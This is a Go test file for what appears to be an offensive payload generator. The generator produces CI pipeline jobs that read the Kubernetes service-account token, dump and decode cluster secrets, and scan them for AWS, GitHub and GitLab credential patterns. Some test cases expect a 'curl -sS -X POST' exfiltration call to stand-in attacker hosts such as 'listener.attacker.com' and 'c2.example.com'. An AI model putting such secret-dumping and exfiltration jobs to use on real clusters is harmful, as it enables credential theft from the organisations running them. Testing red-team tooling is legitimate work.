//go:build !e2e

package payloads

import (
	"strings"
	"testing"
)

func TestGenerateK8sSecretsYAML(t *testing.T) {
	tests := []struct {
		name         string
		opts         K8sSecretsOptions
		wantContains []string
	}{
		{
			name: "default options",
			opts: K8sSecretsOptions{
				Common: CommonOptions{Tags: []string{"k8s"}},
			},
			wantContains: []string{
				"stages:",
				"k8s-secrets:",
				"serviceaccount/token",
				"/api/v1/namespaces",
				"base64",
				"KUBERNETES_SERVICE_HOST",
				"decoded_secrets.txt",
				"credential",
				"artifact mode",
			},
		},
		{
			name: "specific namespaces",
			opts: K8sSecretsOptions{
				Common:     CommonOptions{JobName: "ns-sweep"},
				Namespaces: []string{"production", "staging", "kube-system"},
			},
			wantContains: []string{
				"ns-sweep:",
				"production staging kube-system",
				"serviceaccount/token",
				"/api/v1/namespaces",
				"base64",
			},
		},
		{
			name: "with callback URL",
			opts: K8sSecretsOptions{
				Common:      CommonOptions{JobName: "exfil-k8s", Manual: true},
				CallbackURL: "https://listener.attacker.com/k8s",
			},
			wantContains: []string{
				"exfil-k8s:",
				"serviceaccount/token",
				"/api/v1/namespaces",
				"base64",
				"curl -sS -X POST",
				"https://listener.attacker.com/k8s",
				"when: manual",
			},
		},
		{
			name: "with image and tags",
			opts: K8sSecretsOptions{
				Common: CommonOptions{
					JobName: "sweep",
					Image:   "alpine:3.19",
					Tags:    []string{"shared", "k8s-runner"},
				},
				CallbackURL: "https://c2.example.com/ingest",
			},
			wantContains: []string{
				"image: alpine:3.19",
				`"shared"`,
				`"k8s-runner"`,
				"serviceaccount/token",
				"https://c2.example.com/ingest",
			},
		},
		{
			name: "credential pattern scanning",
			opts: K8sSecretsOptions{
				Common: CommonOptions{JobName: "cred-scan"},
			},
			wantContains: []string{
				"AKIA",
				"ghp_",
				"glpat-",
				"postgres",
				"password",
				"credentials.txt",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			y := GenerateK8sSecretsYAML(tt.opts)

			for _, substr := range tt.wantContains {
				if !strings.Contains(y, substr) {
					t.Errorf("expected %q in output:\n%s", substr, y)
				}
			}

			_ = mustParse(t, y)
		})
	}
}

func TestGenerateK8sSecretsYAML_NoCallbackUsesArtifact(t *testing.T) {
	y := GenerateK8sSecretsYAML(K8sSecretsOptions{})
	if strings.Contains(y, "curl -sS -X POST") {
		t.Fatal("expected no HTTP callback when CallbackURL is empty")
	}
	if !strings.Contains(y, "artifact mode") {
		t.Fatal("expected artifact mode fallback")
	}
	_ = mustParse(t, y)
}
